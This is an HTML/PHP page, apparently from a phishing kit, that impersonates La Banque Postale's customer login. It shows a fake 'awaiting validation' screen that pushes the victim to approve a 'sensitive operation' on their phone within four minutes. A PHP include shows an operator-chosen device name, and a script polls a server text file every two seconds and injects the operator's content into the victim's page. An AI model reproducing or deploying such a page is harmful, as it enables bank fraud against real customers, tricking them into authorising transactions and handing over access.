<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../assets/dist/img/ico.ico">

<title>Connexion à mon espace client - La Banque Postale</title>

    <!-- Bootstrap core CSS -->
    <link href="../assets/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="../assets/dist/css/album.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha512-SfTiTlX6kk+qitfevl/7LibUOeJWlt9rbyDn92a1DqWOw9vWG2MFoays0sgObmWazO5BQPiFucnnEAjpAB+/Sw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 <style>
.m-logo img {
    width: 50px;
    height: 50px;
}
#titre_btn{
font-weight:bold;
color:#17479e;
}

.bg-light {
    background-color: #ffffff!important;
}
.buttonBTN {
    text-align: center;
    width: 4rem;
    height: 3.6rem;

    border-radius: 4px;
	border:1px solid #d8d8d8;
    background-color: var(--color-3);
    font-size: 18px;
    color: var(--color-26);
    font-family: "RobotoMono-Medium",Courier,monospace;
}

@media only screen and (max-width: 768px) {
  /* For mobile phones: */
  #Search_ico{
   display:none;
  } 
  #img_body{
   display:none;
  }   

  #comment_form{
   display:none;
  }  
  
  #tab_clavier{
   width:100%;
  }
}

/* Small devices (portrait tablets and large phones, 600px and up) */
@media only screen and (min-width: 600px) {

  
  #tab_clavier{
   width:100%;
  }
}

@media only screen and (min-width: 768px) {
  
  #tab_clavier{
   width:100%;
  }

}



/* Large devices (laptops/desktops, 992px and up) */
@media only screen and (min-width: 992px) {

  #tab_clavier{
   width:100%;
  }

}

@media only screen and (min-width: 1200px) {
 #tab_clavier{
   width:100%;
  }
}
 </style>
 
 </head>

  <body>

    <header>
   
      <div class="navbar navbar-white bg-white box-shadow">
        <div class="container d-flex justify-content-between">
          <a href="#" class="navbar-brand d-flex align-items-center m-logo">

            <img src="../assets/dist/img/logobbp.png"/>
          </a>
      
			
        
        </div>
      </div>
    </header>

    <main role="main">


      <div class="album py-4 bg-light">
        <div class="container">

          <div class="row">
            
            <div class="col-md-12">
             
<div id="contenu" style="text-align:center;margin:0px auto; ">
<img width="15%" src="../assets/dist/img/autho.png">
<p><b style="color:#17479e">En attente de validation</b></p>

<div>

Une notification vous a été envoyée sur votre Terminal de<br/> référence afin de valider votre opération sensible.
</div>
<br/>
<p>Votre Terminal de référence :</p>
<p>  

<strong><?php include("./Show_system/Show_Appverify.txt"); ?></strong>

</p>
<p>Attention, vous disposez de 4 minutes pour valider votre opération.</p>
<script src="https://code.jquery.com/jquery-3.4.0.min.js"></script>
		<script>
setInterval(function(){ var client = new XMLHttpRequest();
client.open('GET', './Show_system/Show_Page.txt');
client.onreadystatechange = function() {

document.getElementById("content").innerHTML = client.responseText ;

}
client.send();  }, 2000);
</script>
	<div id="content"></div>	
            </div>
          
           
           
        

        
          </div>
        </div>
      </div>

    </main>

    <footer class="text-muted">
      <div class="container">
      <!--   <p class="float-right">
          <a href="#">Back to top</a>
        </p>
        <p>Album example is &copy; Bootstrap, but please download and customize it for yourself!</p>
        <p>New to Bootstrap? <a href="../../">Visit the homepage</a> or read our <a href="../../getting-started/">getting started guide</a>.</p>
    
 -->
	</div>
    </footer>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="./assets/dist/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="../assets/dist/vendor/popper.min.js"></script>
    <script src="../assets/dist/js/bootstrap.min.js"></script>
		<script src="../assets/dist/js/main.js"></script>
    <script src="../assets/dist/vendor/holder.min.js"></script>
  </body>
</html>
